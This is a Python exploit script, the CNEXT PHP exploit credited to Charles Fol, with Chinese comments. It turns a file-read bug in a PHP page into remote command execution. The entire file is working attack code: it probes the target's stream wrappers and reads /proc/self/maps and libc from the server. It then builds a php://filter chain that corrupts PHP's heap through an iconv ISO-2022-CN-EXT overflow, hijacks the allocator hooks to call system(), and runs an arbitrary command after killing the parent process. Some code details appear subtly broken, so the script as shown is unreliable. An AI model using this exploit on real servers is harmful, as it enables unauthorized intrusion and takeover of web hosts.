#!/usr/bin/env python3
#
# CNEXT: PHP 文件读取到远程代码执行
# 日期: 2024-05-27
# 作者: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# 待办事项: 解析 LIBC 以确定是否已打补丁
#
# 信息
#
# 使用时，需要实现 Remote 类，该类定义了如何发送有效载荷。
#
# 要求
#
# 需要 ten: https://github.com/cfreal/ten
#

from __future__ import annotations  # 从 Python 3.7 开始，可以使用注释来表示类的类型。

import base64  # 导入 base64 库，用于数据的编码和解码。
import zlib  # 导入 zlib 库，用于数据的压缩和解压缩。
from dataclasses import dataclass  # 从 dataclasses 模块导入 dataclass 装饰器，用于创建数据类。

from pwn import *  # 导入 pwn 库，常用于安全研究和 CTF 竞赛中，提供了丰富的二进制漏洞利用工具。
from requests.exceptions import ChunkedEncodingError, ConnectionError  # 从 requests 库导入异常处理，用于处理网络请求中的特定错误。
from ten import *  # 假设是一个外部库，需要详细信息来了解其具体功能。

HEAP_SIZE = 2 * 1024 * 1024  # 定义堆大小为 2MB。
BUG = "劄".encode("utf-8")  # 定义一个特定的 UTF-8 编码的二进制数据。


class Remote:
    """一个辅助类，用于发送有效载荷和下载文件。

    利用逻辑总是相同的，但该利用需要知道如何下载文件（如 /proc/self/maps 和 libc）以及如何发送有效载荷。

    这里的代码作为一个示例，用于攻击一个看起来像这样的页面：

    ```php
    <?php

    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```

    根据你的目标调整它，并开始执行利用。
    """

    def __init__(self, url: str) -> None:
        self.url = url  # 初始化时保存 URL。
        self.session = Session()  # 创建一个会话用于发送 HTTP 请求。

    def send(self, path: str) -> Response:
        """给定 `path`，向 HTTP 服务器发送请求。返回响应。
        """
        return self.session.post(self.url, data={"file": path})  # 发送 POST 请求，并传递文件路径。

    def download(self, path: str) -> bytes:
        """返回远程文件的内容。
        """
        path = f"php://filter/convert.base64-encode/resource={path}"  # 修改路径以使用 PHP 的 base64 编码过滤器。
        response = self.send(path)  # 调用 send 方法发送修改后的路径。
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)  # 从响应中提取文件内容。
        return base64.decode(data)  # 解码 base64 数据并返回。

@entry  # 标记这是一个入口点装饰器，通常用于标识主函数或重要的处理函数
@arg("url", "目标 URL")  # 定义参数装饰器，说明“url”参数的用途
@arg("command", "在系统上运行的命令；限制为0x140字节")  # 定义参数装饰器，说明“command”参数的用途和限制
@arg("sleep_time", "为了验证漏洞利用是否成功，设定的睡眠时间。默认为1。")  # 定义参数装饰器，说明“sleep_time”参数的默认值和用途
@arg("heap", "主要的 zend_mm_heap 结构的地址。")  # 定义参数装饰器，说明“heap”参数的用途
@arg(
    "pad",
    "用0x100块进行填充的数量。如果网站在这个大小进行很多堆操作，增加这个值。默认为20。",
)  # 定义参数装饰器，说明“pad”参数的用途和默认值
@dataclass  # 用于创建包含上述参数的数据类
class Exploit:
    """CNEXT漏洞利用：使用PHP中的文件读取原语实现远程代码执行。"""

    url: str  # 目标服务器的URL。
    command: str  # 要在目标系统上执行的命令。
    sleep: int = 1  # 执行后暂停的时间，以秒为单位，默认为1秒。
    heap: str = None  # 主要的zend_mm_heap结构的地址，如果已知。
    pad: int = 20  # 在堆上的填充块数量，默认为20。

    def __post_init__(self):
        self.remote = Remote(self.url)  # 创建一个Remote实例以发送和接收数据。
        self.log = logger("EXPLOIT")  # 初始化日志记录器。
        self.info = {}  # 存储额外信息的字典。
        self.heap = self.heap and int(self.heap, 16)  # 将堆地址转换为十六进制。

    def check_vulnerable(self) -> None:
        """检查目标是否可达并且允许利用需要的各种包装器和过滤器。"""

        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)  # 尝试下载文件。
            except ConnectionError:
                failure("目标不可达？")  # 如果连接错误，则报告目标不可达。

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)  # 安全下载文件。
            return text.encode() == result  # 检查下载的内容是否与预期相符。

        text = tf.random.string(48).encode()  # 生成一个随机字符串并编码。
        base64 = b64(text, misalign=True).decode()  # 对字符串进行Base64编码。
        path = f"data:text/plain;base64,{base64}"  # 构造数据URI。

        result = safe_download(path)  # 下载数据URI内容。

        if text not in result:
            msg_failure("Remote.download 没有返回测试字符串")
            print("--------------------")
            print(f"预期的测试字符串: {text}")
            print(f"实际获取: {result}")
            print("--------------------")
            failure("如果你的代码正常工作，这意味着 data:// 包装器不起作用")

        msg_info("data:// 包装器工作正常")

        text = tf.random.string(48)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("php://filter/ 包装器不起作用")

        msg_info("php://filter/ 包装器工作正常")

        text = tf.random.string(48)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("zlib/ 扩展未启用")

        msg_info("zlib/ 扩展启用")

        msg_success("漏洞利用前提条件满足")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"正在下载 [i]{path}[/]..."):  # 显示下载状态信息。
            return self.remote.download(path)  # 调用 Remote 类的 download 方法下载文件。

    def get_regions(self) -> list[Region]:
        """获取 PHP 进程的内存区域，通过查询 /proc/self/maps。"""
        maps = self.get_file("/proc/self/maps")  # 下载 /proc/self/maps 文件。
        maps = maps.decode()  # 将获取的数据解码为字符串。
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )  # 定义正则表达式以解析内存区域。
        regions = []  # 初始化区域列表。
        for region in table.split(maps, strip=True):  # 切分并迭代每个内存区域描述。
            if match := PATTERN.match(region):  # 如果当前行匹配正则表达式。
                start = int(match.group(1), 16)  # 转换起始地址为十六进制。
                stop = int(match.group(2), 16)  # 转换结束地址为十六进制。
                permissions = match.group(3)  # 获取权限设置。
                path = match.group(4)  # 获取相关路径。
                if "/" in path or "[" in path:  # 如果路径包含特定字符。
                    path = path.rsplit(" ", 1)[-1]  # 从路径中提取最后一部分。
                else:
                    path = ""  # 没有路径则设为空字符串。
                current = Region(start, stop, permissions, path)  # 创建 Region 对象。
                regions.append(current)  # 添加到列表中。
            else:
                print(maps)
                failure("无法解析内存映射")  # 如果无法解析内存映射，显示错误信息。

        self.log.info(f"获取到 {len(regions)} 个内存区域")  # 日志记录获取的区域数量。

        return regions  # 返回内存区域列表。

    def get_symbols_and_addresses(self) -> None:
        """通过文件读取原语获取有用的符号和地址。"""
        regions = self.get_regions()  # 获取所有内存区域。

        LIBC_FILE = "/tmp/cnext-libc"  # 定义用于存储 libc 文件的路径。

        # PHP的堆

        self.info["heap"] = self.heap or self.find_main_heap(regions)  # 获取或查找主堆的地址并存储。

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")  # 查找含有 libc 相关路径的内存区域。

        self.download_file(libc.path, LIBC_FILE)  # 下载 libc 文件到指定路径。

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)  # 加载下载的 libc 文件。
        self.info["libc"].address = libc.start  # 设置 libc 地址。

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """根据给定的名称返回第一个匹配的内存区域。"""
        for region in regions:  # 遍历所有区域。
            if any(name in region.path for name in names):  # 如果区域路径包含任何指定的名称。
                break  # 找到匹配的区域，终止循环。
        else:
            failure("无法定位区域")  # 如果没有找到任何匹配的区域，报告失败。

        return region  # 返回找到的区域。

    def download_file(self, remote_path: str, local_path: str) -> None:
        """将 `remote_path` 的文件下载到 `local path`"""
        data = self.get_file(remote_path)  # 使用 get_file 方法下载远程文件的数据。
        Path(local_path).write(data)  # 将下载的数据写入本地路径。

    def find_main_heap(self, regions: list[Region]) -> Region:
        """在内存中查找 PHP 的主堆地址。"""
        # 所有具有足够大的、匿名、可读写保护的内存区域都是候选区域。堆位于该区域的底部。
        heaps = [
            region.stop - HEAP_SIZE + 0x40  # 计算可能的堆地址。
            for region in reversed(regions)  # 从后向前遍历内存区域。
            if region.permissions == "rw-p"  # 区域需要具有读写权限。
            and region.size >= HEAP_SIZE  # 区域大小需大于或等于基本堆大小。
            and region.stop & (HEAP_SIZE - 1) == 0  # 区域的结束地址需正确对齐。
            and region.path == ""  # 区域应无关联路径。
        ]

        if not heaps:
            failure("无法在内存中找到 PHP 的主堆")  # 如果未找到合适的堆，则报告失败。

        first = heaps[0]  # 获取第一个合适的堆地址。

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))  # 将所有找到的堆地址转换为十六进制字符串。
            msg_info(f"潜在的堆地址: [i]{heaps}[/] (使用第一个)")  # 显示所有潜在的堆地址。
        else:
            msg_info(f"使用 [i]{hex(first)}[/] 作为堆地址")  # 如果只有一个合适的堆地址，则直接使用。

        return first  # 返回选择的堆地址。

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """
        在每一步的漏洞利用过程中，一个过滤器将依次处理每个块。处理通常涉及在块上或同等大小的目标块上执行某种操作。每个操作都应用于每一个块；你不能让 PHP 只对前10个块应用 iconv 而保留其余块不变。这就是困难所在。

        记住，我们知道主堆的地址和库。此处不涉及 ASLR/PIE（地址空间布局随机化/位置独立可执行）。

        我们的想法是利用这个漏洞使大小为 0x100 的块的空闲列表指针下移。例如，我们有以下空闲列表：

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        通过从块 ..900 触发漏洞，我们得到：

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        这是第三步。

        现在，为了控制空闲列表，并使其指向我们想要的地方，我们需要先在地址 0x7fffAABBCCB48 放置一个指针。为此，我们必须已经分配了 0x7fffAABBCCB00 并在偏移 0x48 设置我们的指针。这是第二步。

        现在，如果我们只进行第二步然后第三步，没有其他操作，我们会遇到问题：在第二步处理后，空闲列表会自底向上变化，像这样：

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        我们需要反方向进行。这就是我们有第一步的原因：它只是分配块。当这些块被释放时，它们会反转空闲列表。现在第二步以反向顺序分配，因此在第二步之后，块的顺序是正确的。

        还有一个问题出现了。

        为了在第三步触发溢出，我们从 UTF-8 转换为 ISO-2022-CN-EXT。由于第二步创建的块包含指针，而指针通常不是 UTF-8 编码，我们不能让这种转换发生在第二步的块上。为了避免这种情况，我们把第二步的块放在链的最末端，并用 0\n 作为前缀。当解块（在 iconv 之前）时，它们将从链中“消失”，从而保护它们不受字符集转换的影响，避免不必要的处理错误，这可能会停止处理链。

        第三步之后，我们有了一个带有任意指针的损坏的空闲列表。我们不知道堆的精确布局，但我们知道在堆的顶部存在一个 zend_mm_heap 结构。我们通过两种方式覆盖这个结构。其 free_slot[] 数组包含指向每个空闲列表的指针。通过覆盖它，我们可以使 PHP 分配块到我们想要的任何地方。此外，其 custom_heap 字段包含钩子函数的指针，用于 emalloc、efree 和 erealloc（类似于 libc 中的 malloc_hook、free_hook 等）。我们覆盖它们，然后覆盖 use_custom_heap 标志，使 PHP 使用这些函数指针。现在我们可以执行我们最喜欢的 CTF 技术并调用 system(<chunk>)。我们确保 "system" 命令杀死当前进程，以避免使用随机块数据的其他 system() 调用导致未定义行为。

        填充块只是“填充”我们的分配，以便即使进程的堆处于随机状态，我们仍然获得连续的、有序的块来执行我们的漏洞利用。

        因此，这里描述的整个过程不能崩溃。一切都完美到位，没有什么可以干扰我们的分配。
        """

        # 设置 libc 相关的地址和符号
        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]  # malloc 函数的地址
        ADDR_EFREE = LIBC.symbols["__libc_system"]  # system 函数的地址
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]  # realloc 函数的地址

        # 设置堆相关的地址
        ADDR_HEAP = self.info["heap"]  # 主堆的地址
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20  # free_slot 数组的地址
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168  # custom_heap 字段的地址

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10  # 伪造的 bin 地址

        CS = 0x100  # 块的大小

        # Pad 保持在每个步骤中大小为 0x100
        pad_size = CS - 0x18  # 填充块的大小
        pad = b"\x00" * pad_size
        # 进行多次块压缩和封装
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        # 第一步：预分配并处理块
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # 第二步：由于块包含非 UTF-8 字符，不能转换为 ISO-2022-CN-EXT
        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        # 在块中写入伪造指针
        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        # 第三步：设置溢出
        step3_size = CS
        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        # 触发溢出
        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        # 第四步：调整处理顺序
        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # 这个块最终将覆盖 mm_heap->free_slot
        # 实际上在目标位置前 0x10 字节分配，因此有两个填充值
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        # 创建 custom_heap 结构
        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18  # 指向 emalloc, efree, erealloc 的指针
        )

        # 设定用于自定义堆的块大小
        step4_use_custom_heap_size = 0x140

        # 准备命令
        COMMAND = self.command  # 获取要执行的命令
        COMMAND = f"kill -9 $PPID; {COMMAND}"  # 添加 kill 命令，杀掉父进程防止干扰
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"  # 如果设置了 sleep，添加 sleep 命令
        COMMAND = COMMAND.encode() + b"\x00"  # 编码命令并添加结束符

        # 确保命令大小不超过预设的块大小
        assert (
                len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")  # 填充命令到块大小

        # 将命令封装进块中
        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)  # 执行 QPE 编码
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  # 分块
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  # 再次分块
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  # 再次分块
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)  # 压缩

        # 组合所有步骤的数据块为单一资源
        pages = (
                step4 * 3  # step4 块重复三次
                + step4_pwn  # 加上 pwn 块
                + step4_custom_heap  # 加上 custom_heap 块
                + step4_use_custom_heap  # 加上执行命令的块
                + step3_overflow  # 加上溢出块
                + pad * self.pad  # 填充块，数量为 self.pad
                + step1 * 3  # step1 块重复三次
                + step2_write_ptr  # 加上写入伪造指针的块
                + step2 * 2  # step2 块重复两次
        )

        # 压缩并编码资源
        resource = compress(compress(pages))  # 压缩数据
        resource = b64(resource)  # base64 编码
        resource = f"data:text/plain;base64,{resource.decode()}"  # 创建 data URI

        filters = [
            # 创建数据块
            "zlib.inflate",
            "zlib.inflate",

            # 第 0 步：设置堆
            "dechunk",
            "convert.iconv.latin1.latin1",

            # 第 1 步：反转空闲列表（FL）的顺序
            "dechunk",
            "convert.iconv.latin1.latin1",

            # 第 2 步：放置伪指针并将空闲列表的顺序恢复正常
            "dechunk",
            "convert.iconv.latin1.latin1",

            # 第 3 步：触发溢出
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",

            # 第 4 步：在任意地址分配并改变 zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.latin1.latin1",
        ]
        filters = "|".join(filters)  # 将所有过滤器合并为一个字符串
        path = f"php://filter/read={filters}/resource={resource}"  # 构造包含所有过滤器的 PHP 流路径

        return path  # 返回构造的路径

    @inform("Triggering...")  # 输出触发操作的信息
    def exploit(self) -> None:
        path = self.build_exploit_path()  # 构建利用路径
        start = time.time()  # 记录开始时间

        try:
            self.remote.send(path)  # 发送构造的路径到远程服务器
        except (ConnectionError, ChunkedEncodingError):
            pass  # 如果发生连接错误或分块编码错误，忽略

        msg_print()  # 打印空行

        if not self.sleep:
            msg_print(
                "    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")  # 如果没有设置 sleep，假设利用成功
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")  # 如果设置了 sleep 并且时间已经足够，显示成功信息
        else:
            # 可能是错误的堆地址？如果有其他推荐的地址，尝试它们！
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")  # 否则，显示失败信息

        msg_print()  # 再次打印空行


def compress(data) -> bytes:
    """返回适用于 `zlib.inflate` 的数据。
    """
    # 移除 2 字节的头部和 4 字节的校验和
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    """对数据进行 base64 编码，并可选择是否对齐。
    """
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()

def compressed_bucket(data: bytes) -> bytes:
    """返回一个 0x8000 大小的块，当解块后返回原数据。
    """
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """模拟 quoted-printable 编码。
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """创建一个 0x8000 大小的块，运行所有步骤后揭示指针。
    """
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> done:
    """构造给定块的分块表示形式。如果给定了大小，分块表示的大小为 `size`。
    例如，使用大小 10 的 `ABCD` 变为: `0004\nABCD\n`。
    """
    if size is None:
        size = len(data) + 8  # 如果未指定大小，自动增加 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"

@dataclass
class Region:
    """一个内存区域。"""

    start: int  # 开始地址
    stop: int  # 结束地址
    permissions: str  # 权限设置
    path: str  # 相关路径

    @property
    def size(self) -> int:
        """计算并返回区域的大小。"""
        return self.stop - self.start

Exploit()  # 实例化 Exploit 类

